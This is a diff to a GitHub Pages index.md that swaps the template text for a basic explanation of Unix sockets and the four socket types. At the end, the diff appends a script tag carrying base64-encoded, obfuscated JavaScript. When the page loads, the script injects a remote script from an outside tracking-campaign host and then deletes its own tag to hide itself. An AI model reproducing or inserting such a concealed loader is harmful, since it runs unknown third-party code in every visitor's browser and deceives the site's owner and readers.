@@ -1,37 +1,23 @@
-## Welcome to GitHub Pages
+Sockets allow communication between two different processes on the same or different machines. To be more precise, it's a way to talk to other computers using standard Unix file descriptors. In Unix, every I/O action is done by writing or reading a file descriptor. A file descriptor is just an integer associated with an open file and it can be a network connection, a text file, a terminal, or something else.
 
-You can use the [editor on GitHub](https://github.com/ofoganovx/socket/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+To a programmer, a socket looks and behaves much like a low-level file descriptor. This is because commands such as read() and write() work with sockets in the same way they do with files and pipes.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Sockets were first introduced in 2.1BSD and subsequently refined into their current form with 4.2BSD. The sockets feature is now available with most current UNIX system releases.
 
-### Markdown
+Where is Socket Used?
+A Unix Socket is used in a client-server application framework. A server is a process that performs some functions on request from a client. Most of the application-level protocols like FTP, SMTP, and POP3 make use of sockets to establish connection between client and server and then for exchanging data.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Socket Types
+There are four types of sockets available to the users. The first two are most commonly used and the last two are rarely used.
 
-```markdown
-Syntax highlighted code block
+Processes are presumed to communicate only between sockets of the same type but there is no restriction that prevents communication between sockets of different types.
 
-# Header 1
-## Header 2
-### Header 3
+Stream Sockets − Delivery in a networked environment is guaranteed. If you send through the stream socket three items "A, B, C", they will arrive in the same order − "A, B, C". These sockets use TCP (Transmission Control Protocol) for data transmission. If delivery is impossible, the sender receives an error indicator. Data records do not have any boundaries.
 
-- Bulleted
-- List
+Datagram Sockets − Delivery in a networked environment is not guaranteed. They're connectionless because you don't need to have an open connection as in Stream Sockets − you build a packet with the destination information and send it out. They use UDP (User Datagram Protocol).
 
-1. Numbered
-2. List
+Raw Sockets − These provide users access to the underlying communication protocols, which support socket abstractions. These sockets are normally datagram oriented, though their exact characteristics are dependent on the interface provided by the protocol. Raw sockets are not intended for the general user; they have been provided mainly for those interested in developing new communication protocols, or for gaining access to some of the more cryptic facilities of an existing protocol.
 
-**Bold** and _Italic_ and `Code` text
+Sequenced Packet Sockets − They are similar to a stream socket, with the exception that record boundaries are preserved. This interface is provided only as a part of the Network Systems (NS) socket abstraction, and is very important in most serious NS applications. Sequenced-packet sockets allow the user to manipulate the Sequence Packet Protocol (SPP) or Internet Datagram Protocol (IDP) headers on a packet or a group of packets, either by writing a prototype header along with whatever data is to be sent, or by specifying a default header to be used with all outgoing data, and allows the user to receive the headers on incoming packets.
 
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/ofoganovx/socket/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
